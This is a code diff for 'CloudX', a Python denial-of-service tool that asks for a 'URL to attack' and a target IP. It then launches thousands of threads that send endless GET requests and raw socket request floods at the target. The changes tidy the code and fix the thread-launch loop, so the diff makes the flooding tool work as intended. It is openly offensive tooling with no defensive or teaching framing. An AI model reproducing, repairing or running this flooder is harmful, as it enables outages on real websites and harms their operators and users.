@@ -1,14 +1,14 @@
 import threading
 import socket
-import sys
 import urllib.request
 import urllib.error
 import random
 import os
 import time
+
 os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
-logo="""
+logo = """
 < =============== >
       CloudX
 ^ <=============> ^
@@ -21,7 +21,7 @@ ip = ""
 port = ""
 threads = ""
 method = ""
-maxThreads = int(35999)
+maxThreads = 35999
 
 url = input("[+] Enter a URL to attack: ")
 ip = input("[+] Enter the target IP address: ")
@@ -30,20 +30,28 @@ numberOfThreads = input("[+] Enter the desired number of threads (default: 16500
 method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
 print("[Check Traffic!]")
 time.sleep(0.5)
+
 if port == "":
-    port = str(80)
+    port = 80
+else:
+    port = int(port)
+
 if numberOfThreads == "":
-    numberOfThreads = int(17500)
-if maxThreads < int(numberOfThreads):
-    numberOfThreads = int(maxThreads)
+    numberOfThreads = 17500
+else:
+    numberOfThreads = int(numberOfThreads)
+
+if numberOfThreads > maxThreads:
+    numberOfThreads = maxThreads
+
 if method == "":
     method = "GET"
 
 # Construct attack parameters ( User Agen nya broo )
 headers = {
-'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
-'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-'Connection': 'close'
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Connection': 'close'
 }
 
 USER_AGENT_PARTS = {
@@ -87,11 +95,11 @@ def attack(ip, port, threadNum):
     request = urllib.request.Request(url, None, headers)
     while True:
         try:
-            if method  == "GET":
+            if method == "GET":
                 urlsocket_file = urllib.request.urlopen(request)
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
-                s.connect((ip, int(port)))
+                s.connect((ip, port))
                 for _ in range(6500):
                     s.send(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'))
                     s.send("Host: %s\r\n\r\n" % (url))
@@ -111,10 +119,11 @@ def flood_url():
         urllib.request.urlopen(request)
 
 # Mulai ( start flooding )
-threading.Thread(target=attack, args=(ip,port,i)).start()
+for i in range(numberOfThreads):
+    threading.Thread(target=attack, args=(ip, port, i)).start()
 threading.Thread(target=flood_url).start()
 
-#NOTE
+# NOTE
 """
-CloudX is under development so dont have high expectations about this. alright?
+CloudX is under development, so don't have high expectations about this. alright?
 """
